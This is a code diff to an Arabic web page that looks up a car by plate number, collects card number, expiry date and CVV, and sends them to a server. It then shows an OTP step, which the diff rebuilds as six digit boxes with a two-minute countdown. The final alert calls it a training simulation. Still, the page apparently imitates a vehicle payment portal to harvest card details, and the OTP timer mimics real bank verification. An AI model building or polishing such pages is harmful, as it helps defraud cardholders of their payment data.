@@ -79,6 +79,37 @@
             border: 2px dashed #ff9800;
             margin: 15px 0;
         }
+        .otp-inputs {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        .otp-input {
+            width: 50px;
+            height: 50px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            padding: 0;
+        }
+        .otp-input:focus {
+            outline: none;
+            border-color: #0055a4;
+            box-shadow: 0 0 5px rgba(0, 85, 164, 0.3);
+        }
+        .timer {
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            margin: 10px 0;
+            color: #d32f2f;
+        }
+        .timer.active {
+            color: #28a745;
+        }
     </style>
 </head>
 <body>
@@ -122,9 +153,17 @@
     <!-- الخطوة 4 -->
     <div id="step4" class="card hidden">
         <div class="step">الخطوة 4: إدخال رمز التحقق OTP</div>
+        <div class="timer" id="timer"></div>
         <div id="otpDisplay" class="otp-box"></div>
-        <label>أدخل الرقم الذي يظهر أعلاه:</label>
-        <input type="text" id="otpCode" maxlength="6" placeholder="أدخل الرقم" dir="ltr">
+        <label>أدخل الرقم الذي يظهر أعلاه (6 أرقام):</label>
+        <div class="otp-inputs" id="otpInputContainer">
+            <input type="text" maxlength="1" class="otp-input" id="otp1" inputmode="numeric" pattern="[0-9]">
+            <input type="text" maxlength="1" class="otp-input" id="otp2" inputmode="numeric" pattern="[0-9]">
+            <input type="text" maxlength="1" class="otp-input" id="otp3" inputmode="numeric" pattern="[0-9]">
+            <input type="text" maxlength="1" class="otp-input" id="otp4" inputmode="numeric" pattern="[0-9]">
+            <input type="text" maxlength="1" class="otp-input" id="otp5" inputmode="numeric" pattern="[0-9]">
+            <input type="text" maxlength="1" class="otp-input" id="otp6" inputmode="numeric" pattern="[0-9]">
+        </div>
         <button onclick="verifyOtp()">تأكيد وإنهاء</button>
         <button class="secondary" onclick="reset()">رجوع</button>
     </div>
@@ -141,6 +180,8 @@
 
     let currentCar = null;
     let generatedOtp = null;
+    let timerInterval = null;
+    let timeRemaining = 120;
 
     function searchCar() {
         const plaque = document.getElementById('plaque').value.trim();
@@ -216,9 +257,17 @@
             
             if (response.ok) {
                 console.log("[v0] Payment data sent successfully");
-                // توليد OTP عشوائي
+                // توليد OTP عشوائي (6 أرقام)
                 generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
                 document.getElementById('otpDisplay').innerHTML = generatedOtp;
+                
+                // بدء العداد التنازلي
+                startTimer();
+                
+                // تنظيف حقول OTP السابقة
+                for (let i = 1; i <= 6; i++) {
+                    document.getElementById(`otp${i}`).value = '';
+                }
                 
                 showStep(4);
             } else {
@@ -229,26 +278,69 @@
             alert('حدث خطأ في إرسال البيانات: ' + error.message);
         }
     }
-        if (!expiry || expiry.length < 5) {
-            alert('الرجاء إدخال تاريخ انتهاء صحي�� (MM/YY)');
-            return;
-        }
-        if (!cvv || cvv.length < 3) {
-            alert('الرجاء إدخال الرمز السري المكون من 3 أرقام');
-            return;
+
+    function startTimer() {
+        timeRemaining = 120;
+        updateTimerDisplay();
+        
+        if (timerInterval) {
+            clearInterval(timerInterval);
         }
         
-        // توليد OTP عشوائي
-        generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
-        document.getElementById('otpDisplay').innerHTML = generatedOtp;
+        timerInterval = setInterval(() => {
+            timeRemaining--;
+            updateTimerDisplay();
+            
+            if (timeRemaining <= 0) {
+                clearInterval(timerInterval);
+                alert('انتهت صلاحية الكود. الرجاء المحاولة مرة أخرى');
+                reset();
+            }
+        }, 1000);
+    }
+
+    function updateTimerDisplay() {
+        const minutes = Math.floor(timeRemaining / 60);
+        const seconds = timeRemaining % 60;
+        const timerElement = document.getElementById('timer');
+        timerElement.textContent = `الوقت المتبقي: ${minutes}:${seconds.toString().padStart(2, '0')}`;
         
-        showStep(4);
+        if (timeRemaining <= 30) {
+            timerElement.classList.add('active');
+        }
+    }
+
+    // التعامل مع حقول OTP
+    function setupOtpInputs() {
+        for (let i = 1; i <= 6; i++) {
+            const input = document.getElementById(`otp${i}`);
+            input.addEventListener('input', (e) => {
+                if (e.target.value && i < 6) {
+                    document.getElementById(`otp${i + 1}`).focus();
+                }
+            });
+            
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && i > 1) {
+                    document.getElementById(`otp${i - 1}`).focus();
+                }
+            });
+        }
     }
 
     function verifyOtp() {
-        const enteredCode = document.getElementById('otpCode').value.trim();
+        let enteredCode = '';
+        for (let i = 1; i <= 6; i++) {
+            enteredCode += document.getElementById(`otp${i}`).value;
+        }
+        
+        if (enteredCode.length !== 6) {
+            alert('الرجاء إدخال جميع الأرقام الستة');
+            return;
+        }
         
         if (enteredCode === generatedOtp) {
+            clearInterval(timerInterval);
             alert('✅ تمت العملية التدريبية بنجاح! شكراً لك.\n(هذه محاكاة تدريبية فقط)');
             reset();
         } else {
@@ -262,16 +354,27 @@
         document.getElementById('step3').classList.add('hidden');
         document.getElementById('step4').classList.add('hidden');
         document.getElementById(`step${step}`).classList.remove('hidden');
+        
+        if (step === 4) {
+            setupOtpInputs();
+            document.getElementById('otp1').focus();
+        }
     }
 
     function reset() {
         currentCar = null;
         generatedOtp = null;
+        timeRemaining = 120;
+        if (timerInterval) {
+            clearInterval(timerInterval);
+        }
         document.getElementById('plaque').value = '';
         document.getElementById('cardNumber').value = '';
         document.getElementById('expiry').value = '';
         document.getElementById('cvv').value = '';
-        document.getElementById('otpCode').value = '';
+        for (let i = 1; i <= 6; i++) {
+            document.getElementById(`otp${i}`).value = '';
+        }
         showStep(1);
     }
 </script>
